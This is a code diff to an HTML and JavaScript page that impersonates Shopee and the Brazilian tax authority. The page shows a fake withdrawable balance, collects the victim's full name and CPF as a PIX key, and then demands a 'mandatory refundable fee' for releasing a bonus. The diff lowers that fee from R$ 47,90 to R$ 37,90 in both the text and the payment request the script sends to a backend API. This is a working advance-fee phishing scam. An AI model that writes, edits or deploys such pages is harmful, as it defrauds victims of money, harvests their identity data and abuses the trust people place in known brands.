@@ -9,7 +9,7 @@
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #e5e5e5; /* Fundo cinza sólido, igual ao print */
+            background-color: #e5e5e5;
             margin: 0; padding: 15px;
             color: #333;
             min-height: 100vh;
@@ -31,7 +31,7 @@
 
         /* --- TELA 1: SALDO --- */
         .top-card {
-            background: #ee4d2d; /* Laranja Sólido Shopee */
+            background: #ee4d2d;
             padding: 20px;
             border-radius: 8px;
             color: white;
@@ -44,17 +44,17 @@
         .shopee-bag {
             position: absolute; top: 20px; right: 20px;
             width: 40px; height: 48px;
-            background: #f0c419; /* Amarelo Ouro */
+            background: #f0c419;
             border-radius: 4px;
             display: flex; align-items: center; justify-content: center;
         }
-        .shopee-bag::before { /* Alça da sacola */
+        .shopee-bag::before {
             content: ''; position: absolute; top: -10px; left: 10px;
             width: 20px; height: 20px;
             border: 4px solid #f0c419;
             border-bottom: none; border-radius: 20px 20px 0 0;
         }
-        .shopee-bag::after { /* Letra S */
+        .shopee-bag::after {
             content: 'S'; color: #ee4d2d; font-weight: 900; font-size: 28px; font-family: sans-serif;
         }
 
@@ -78,7 +78,7 @@
         /* Opções de Valor */
         .transfer-row { display: flex; align-items: center; font-size: 14px; color: #777; margin-bottom: 15px; }
         .pix-tag { 
-            color: #32aba3; /* Cor "Teal" do Pix */
+            color: #32aba3;
             font-weight: 700; font-size: 16px; margin-left: 5px; 
             font-family: sans-serif;
         }
@@ -97,10 +97,9 @@
             background: #f5f5f5; border: 1px solid #f5f5f5; border-radius: 4px;
             text-align: center; cursor: pointer;
         }
-        /* Selecionado */
         .selected { border: 1px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
 
-        /* Card de Texto (Rodapé) */
+        /* Footer */
         .footer-content { display: flex; gap: 15px; align-items: flex-start; }
         .footer-text { font-size: 11px; color: #666; line-height: 1.4; text-align: justify; }
         .footer-bag { width: 40px; opacity: 0.9; }
@@ -142,7 +141,7 @@
         .footer-logos { display: flex; justify-content: center; gap: 20px; align-items: center; margin: 30px 0 50px 0; filter: grayscale(100%); opacity: 0.6; }
         .logo-img { height: 20px; width: auto; }
 
-        /* Popup QR Code */
+        /* QR Modal */
         #qr-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; align-items: center; justify-content: center; }
         .qr-box { background: white; width: 90%; max-width: 320px; border-radius: 8px; padding: 25px; text-align: center; }
         .pix-code-area { background: #f5f5f5; border: 1px dashed #ccc; padding: 10px; font-size: 11px; word-break: break-all; margin: 15px 0; color: #555; border-radius: 4px; }
@@ -151,19 +150,17 @@
 <body>
 
     <div id="step-1">
-        
         <div class="top-card">
-            <div class="shopee-bag"></div> <div class="header-top">Seu saldo</div>
+            <div class="shopee-bag"></div>
+            <div class="header-top">Seu saldo</div>
             <div class="saldo-valor">R$ 1.489,38</div>
             <div class="pontos-text">= 42.583,05 pontos (s)</div>
-            
             <div class="divider"></div>
             <div class="bonus-text">Última bonificação apresentada : R$ 845,24</div>
         </div>
 
         <div class="card-white">
             <div class="card-title">Sacar dinheiro</div>
-            
             <div class="transfer-row">
                 <span style="font-size: 18px; margin-right: 5px;">💳</span> Transferência via <span class="pix-tag">Pix</span>
             </div>
@@ -179,51 +176,43 @@
             </div>
 
             <button id="btn-sacar-1" class="btn-main btn-disabled" onclick="openStep2()">
-                Sacar dinheiro
+                SACAR DINHEIRO
             </button>
-
-            <p style="font-size:11px; color:#999; text-align:center; margin-top:15px; line-height:1.4;">
-                Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
+            <p style="font-size:11px; color:#999; text-align:center; margin-top:15px;">
+                Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.
             </p>
         </div>
 
         <div class="card-white">
             <div class="card-title" style="margin-bottom: 10px;">Obtenha seu acesso exclusivo</div>
-            
             <div class="footer-content">
                 <div class="footer-text">
-                    Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações. Não perca a oportunidade de garantir algo que é limitado e pensado para quem chegou até aqui.
+                    Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis.
                 </div>
                 <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="footer-bag">
             </div>
         </div>
     </div>
 
-
     <div id="step-2" class="modal-overlay hidden">
         <div class="modal-sheet">
             <h2 style="text-align:center; font-size:18px; margin-bottom:25px; color:#000;">Vincular PIX</h2>
-            
             <div class="input-group">
                 <label class="input-label">Nome Completo</label>
                 <input type="text" id="input-nome" class="input-field" placeholder="Nome do titular">
             </div>
-
             <div class="input-group">
                 <label class="input-label">Tipo de Chave PIX</label>
                 <select class="input-field" style="background:white;"><option>CPF</option></select>
             </div>
-
             <div class="input-group">
                 <label class="input-label">Chave PIX</label>
                 <input type="tel" id="input-cpf" class="input-field" placeholder="Digite sua chave" maxlength="14" oninput="mask(this)">
             </div>
-
             <button class="btn-main" onclick="openStep3()">CONTINUAR</button>
             <p style="text-align:center; font-size:11px; color:#ccc; margin-top:20px;">Ambiente seguro Shopee Pay</p>
         </div>
     </div>
-
 
     <div id="step-3" class="hidden" style="background: #f5f5f5; min-height: 100vh;">
         <div class="shopee-top-bar">
@@ -239,11 +228,11 @@
         <div class="info-card">
             <div class="info-title">CONFIRMAÇÃO DE IDENTIDADE</div>
             <div style="display:flex; align-items:center; margin-bottom:10px; gap: 8px;">
-                <span style="font-size:22px; font-weight:800; color:#ee4d2d;">R$ 47,90</span>
+                <span style="font-size:22px; font-weight:800; color:#ee4d2d;">R$ 37,90</span>
                 <span style="background:#e8f5e9; color:#2e7d32; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:700;">VALOR REEMBOLSÁVEL</span>
             </div>
             <p style="font-size:13px; color:#555; line-height:1.4;">
-                Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 47,90</strong> será reembolsado integralmente para você em 1 minuto.
+                Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 37,90</strong> será reembolsado integralmente para você em 1 minuto.
             </p>
         </div>
 
@@ -282,7 +271,6 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-img">
         </div>
     </div>
-
 
     <div id="qr-modal">
         <div class="qr-box">
@@ -351,10 +339,11 @@
             btn.classList.add('btn-disabled');
 
             try {
+                // VALOR CORRIGIDO AQUI PARA 37.90
                 const response = await fetch(`${API_URL}/pix`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ amount: 47.90, name: nome, cpf: cpf })
+                    body: JSON.stringify({ amount: 37.90, name: nome, cpf: cpf })
                 });
                 const data = await response.json();
 
